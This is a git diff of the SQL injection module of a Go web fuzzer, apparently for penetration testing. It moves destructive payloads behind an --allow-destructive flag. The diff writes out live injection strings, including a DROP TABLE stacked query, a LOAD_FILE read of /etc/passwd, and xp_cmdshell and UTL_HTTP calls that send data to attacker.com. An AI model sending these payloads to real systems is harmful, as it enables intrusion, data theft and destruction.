@@ -6,17 +6,25 @@ import (
 
 	"github.com/renansj/ryofuzz/internal/input"
 	"github.com/renansj/ryofuzz/internal/mutator"
+	"github.com/renansj/ryofuzz/internal/util"
 )
 
 type SQLiModule struct{}
 
-func (m *SQLiModule) Name() string        { return "sqli" }
-func (m *SQLiModule) Description() string { return "SQL Injection (error, blind, time, union, stacked)" }
+func (m *SQLiModule) Name() string { return "sqli" }
+func (m *SQLiModule) Description() string {
+	return "SQL Injection (error, blind, time, union, stacked)"
+}
 
 func (m *SQLiModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
 	var payloads []mutator.Payload
 
 	raw := sqliPayloads()
+	// Destructive payloads (stacked writes, xp_cmdshell, LOAD_FILE, UTL_HTTP)
+	// only run when the operator explicitly opts in via --allow-destructive (F1).
+	if AllowDestructive() {
+		raw = append(raw, destructiveSQLiPayloads()...)
+	}
 
 	for _, point := range points {
 		for _, p := range raw {
@@ -110,7 +118,7 @@ func (m *SQLiModule) Detect(payload mutator.Payload, baseBody string, baseStatus
 	if strings.Contains(payload.Variant, "boolean") {
 		baseLen := len(baseBody)
 		respLen := len(respBody)
-		diff := abs(respLen - baseLen)
+		diff := util.Abs(respLen - baseLen)
 		if diff > 50 && respStatus == baseStatus {
 			return &Finding{
 				Module:      "sqli",
@@ -179,15 +187,10 @@ func sqliPayloads() []sqliPayload {
 		{`' OR SUBSTRING(@@version,1,1)='5`, "boolean"},
 		{`' AND (SELECT COUNT(*) FROM information_schema.tables)>0--`, "boolean"},
 
-		// Stacked queries
-		{`'; DROP TABLE test--`, "stacked"},
+		// Stacked queries (non-destructive proof only). The classic
+		// '; DROP TABLE ... proof is destructive and lives in
+		// destructiveSQLiPayloads(), gated by --allow-destructive (F1).
 		{`'; SELECT 1;--`, "stacked"},
-		{`1; SELECT pg_sleep(5);--`, "stacked"},
-
-		// Out-of-band (OOB)
-		{`' UNION SELECT LOAD_FILE('/etc/passwd')--`, "oob"},
-		{`'; EXEC xp_cmdshell('nslookup attacker.com')--`, "oob-mssql"},
-		{`' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--`, "oob-oracle"},
 
 		// WAF bypass
 		{`' /*!50000OR*/ 1=1--`, "waf-bypass"},
@@ -203,9 +206,18 @@ func sqliPayloads() []sqliPayload {
 	}
 }
 
-func abs(x int) int {
-	if x < 0 {
-		return -x
+// destructiveSQLiPayloads returns payloads that can mutate or exfiltrate data
+// on a vulnerable target: stacked writes that drop tables, OS command execution
+// via xp_cmdshell, arbitrary file reads via LOAD_FILE, and outbound requests via
+// UTL_HTTP. These run ONLY under --allow-destructive (F1). Against a real
+// stacked-query injection, '; DROP TABLE would delete client data, an incident
+// even in an authorized engagement, so it must never be in the default set.
+func destructiveSQLiPayloads() []sqliPayload {
+	return []sqliPayload{
+		{`'; DROP TABLE test--`, "stacked-destructive"},
+		{`1; SELECT pg_sleep(5);--`, "stacked-destructive"},
+		{`' UNION SELECT LOAD_FILE('/etc/passwd')--`, "oob-file"},
+		{`'; EXEC xp_cmdshell('nslookup attacker.com')--`, "oob-mssql"},
+		{`' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--`, "oob-oracle"},
 	}
-	return x
 }
